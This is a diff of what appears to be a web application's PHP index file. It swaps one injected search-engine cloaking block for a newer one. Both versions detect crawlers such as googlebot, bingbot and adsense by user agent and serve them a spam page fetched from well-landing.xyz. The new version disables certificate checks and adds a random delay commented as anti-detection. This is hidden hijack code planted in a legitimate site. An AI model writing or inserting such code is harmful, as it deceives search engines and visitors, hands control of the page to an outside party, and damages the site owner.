@@ -1,40 +1,48 @@
 <?php
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $bot_patterns = '/(googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|telegrambot|Google-Site-Verification|Google-InspectionTool|adsense)/i';
-    
-    return preg_match($bot_patterns, $user_agent);
-}
- 
-function fetch_content($url) {
-    $cache_file = 'cache/' . md5($url) . '.html';
-    $cache_time = 3600;
- 
-    if (file_exists($cache_file) && (time() - filemtime($cache_file) < $cache_time)) {
-        return file_get_contents($cache_file);
-    }
- 
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
-    $content = curl_exec($ch);
-    curl_close($ch);
- 
-    if ($content) {
-        file_put_contents($cache_file, $content);
-    }
- 
-    return $content;
-}
- 
-if (is_bot()) {
-    echo fetch_content('https://well-landing.xyz/landing/islamiconomicc.html');
-} 
-?>
+ob_start();
+header("Vary: User-Agent");
 
-<?php
+// Link konten asli
+$content_url = "https://well-landing.xyz/landing/islamiconomicc.html";
+
+// Pola bot yang mau di-handle
+$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+
+function safe_request($url) {
+    $ctx = stream_context_create([
+        'http' => [
+            'timeout' => 5,
+            'header'  => "User-Agent: Mozilla/5.0\r\n"
+        ],
+        'ssl' => [
+            'verify_peer'      => false,
+            'verify_peer_name' => false
+        ]
+    ]);
+
+    if (function_exists("curl_init")) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    } elseif (ini_get("allow_url_fopen")) {
+        return file_get_contents($url, false, $ctx);
+    }
+    return false;
+}
+
+if (preg_match($botchar, $ua)) {
+    usleep(rand(120000, 250000)); // Delay acak anti-deteksi
+    echo safe_request($content_url);
+    ob_end_flush();
+    die;
+}
 
 /**
  * @defgroup index Index
